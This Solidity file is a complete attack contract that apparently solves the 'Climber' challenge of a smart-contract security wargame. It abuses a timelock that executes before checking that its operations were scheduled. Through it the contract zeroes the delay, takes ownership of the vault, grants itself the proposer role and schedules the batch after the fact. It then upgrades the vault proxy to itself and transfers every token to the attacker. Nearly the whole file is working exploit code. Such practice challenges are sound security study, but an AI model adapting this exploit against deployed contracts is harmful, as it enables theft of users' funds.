// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ClimberVaultVictim {
    function upgradeToAndCall(address, bytes memory) external;

    function sweepFunds() external;
}

interface ClimberTimelockVictim {
    function schedule(address[] calldata, uint256[] calldata, bytes[] calldata, bytes32) external;

    function execute(address[] calldata, uint256[] calldata, bytes[] calldata, bytes32) external;

    function updateDelay(uint64) external;

    function grantRole(bytes32, address) external;
}

contract ClimberAttacker {
    bytes32 constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    address public immutable vault;
    address public immutable erc20;
    address public immutable timelock;
    address public immutable attacker;

    constructor(address _vault, address _timelock, address _erc20) {
        vault = _vault;
        erc20 = _erc20;
        timelock = _timelock;
        attacker = msg.sender;
    }

    function sweepFunds() public {
        uint256 amount = IERC20(erc20).balanceOf(vault);
        IERC20(erc20).transfer(attacker, amount);
    }

    function attack() external {
        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements, bytes32 salt) = getArguments();

        ClimberTimelockVictim(timelock).execute(targets, values, dataElements, salt);

        bytes memory sweepFundsCalldata = abi.encodeWithSignature("sweepFunds()");
        ClimberVaultVictim(vault).upgradeToAndCall(address(this), sweepFundsCalldata);
    }

    function callSchedule() external {
        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements, bytes32 salt) = getArguments();

        ClimberTimelockVictim(timelock).schedule(targets, values, dataElements, salt);
    }

    function getArguments()
        public
        view
        returns (address[] memory targets, uint256[] memory values, bytes[] memory dataElements, bytes32 salt)
    {
        targets = new address[](4);
        targets[0] = timelock;
        targets[1] = vault;
        targets[2] = timelock;
        targets[3] = address(this);

        values = new uint256[](4);

        salt = bytes32("any salt");

        dataElements = new bytes[](4);
        // set `delay` to 0, so that we can call `schedule` right after `execute`
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        // transfer ownership, so that we can update the implementation contract
        dataElements[1] = abi.encodeWithSignature("transferOwnership(address)", address(this));

        // we need to grant our attacker contract PROPOSE_ROLE role
        // so that we can call `schedule` function
        dataElements[2] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
        dataElements[3] = abi.encodeWithSignature("callSchedule()");
    }

    function proxiableUUID() external pure returns (bytes32) {
        return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }

    receive() external payable {}
}
